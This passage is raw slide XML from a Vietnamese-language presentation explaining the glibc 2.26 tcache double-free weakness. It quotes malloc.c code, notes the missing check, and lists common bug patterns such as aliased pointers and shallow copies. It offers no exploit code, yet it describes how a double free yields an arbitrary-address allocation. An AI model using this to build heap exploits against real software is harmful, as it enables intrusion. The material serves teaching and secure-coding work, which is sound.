              <a:t>  e-&gt;next = tcache-&gt;entries[tc_idx];</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tcache-&gt;entries[tc_idx] = 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++(tcache-&gt;counts[tc_idx]);</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="2606040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2807"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1581912"/>
            <a:ext cx="5157216" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>THIẾU KIỂM TRA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="5157216" cy="41148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Điều kiện duy nhất: counts &lt; 7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="2331720"/>
            <a:ext cx="5157216" cy="1581912"/>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Không dòng nào hỏi chunk này đã có trong bin chưa. Đây là thiết kế gốc của tcache 2.26, chưa tính tới double free.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4206240"/>
            <a:ext cx="5522976" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3636"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="437083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TCACHE_PUT / TCACHE_GET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4663440"/>
            <a:ext cx="5157216" cy="1444752"/>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accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>e-&gt;next</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ghi vào đúng 8 byte đầu user data: user data thành con trỏ list</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_get</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trả y nguyên </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>entries[idx]</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, không kiểm tra chunk còn sống hay không</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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Vị trí #3: malloc() tin tuyệt đối vào tcache_get()</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3 · malloc.c:3027–3052</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6035040" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5669280" cy="457200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void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__libc_malloc (size_t bytes)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void *(*hook) (size_t, const void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atomic_forced_read (__malloc_hook);</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if (__builtin_expect (hook != NULL, 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return (*hook)(bytes, RETURN_ADDRESS (0));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#if USE_TCACHE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size_t tc_idx = csize2tidx (tbytes);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MAYBE_INIT_TCACHE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if (tc_idx &lt; mp_.tcache_bins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&amp;&amp; tcache</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>      return tcache_get (tc_idx);</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#endif</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1417320"/>
            <a:ext cx="5010912" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1581912"/>
            <a:ext cx="464515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CŨNG CÓ HOOK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1874520"/>
            <a:ext cx="4645152" cy="896112"/>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Kiểm tra </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__malloc_hook</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trước (malloc.c:1866), giống </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3108960"/>
            <a:ext cx="5010912" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3273552"/>
            <a:ext cx="464515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ĐƯỜNG TẮT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3566160"/>
            <a:ext cx="4645152" cy="1033272"/>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Bin còn entry thì trả ngay kết quả </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_get()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: không chạm </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>_int_malloc</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, không kiểm tra thêm.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4937760"/>
            <a:ext cx="5010912" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5102352"/>
            <a:ext cx="4645152"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KẾT LUẬN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5394960"/>
            <a:ext cx="4645152" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Từ một </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> lỗi tới một </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trả địa chỉ tuỳ ý chỉ cách nhau dòng </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_get()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</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Điều kiện phát sinh double free</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1 · 5.2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="11274552" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6957"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="10908792"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CỐT LÕI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="10908792" cy="484632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> hai lần cùng một địa chỉ, giữa hai lần vùng nhớ không được cấp lại: con trỏ không được gán NULL, hoặc có hai con trỏ alias cùng trỏ một vùng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2697480"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="286207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HAI CON TRỎ ALIAS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3154680"/>
            <a:ext cx="2281428" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>p = q = malloc(n); free(p); free(q);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="2697480"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="286207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NHÁNH LỖI + CLEANUP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="3154680"/>
            <a:ext cx="2281428" cy="107899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Nhánh xử lý lỗi đã free, nhánh cleanup chung free lại</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="2697480"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="286207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SHALLOW COPY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3154680"/>
            <a:ext cx="2281428" cy="107899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Copy nông struct/object chứa con trỏ, hai bản cùng free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="2697480"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
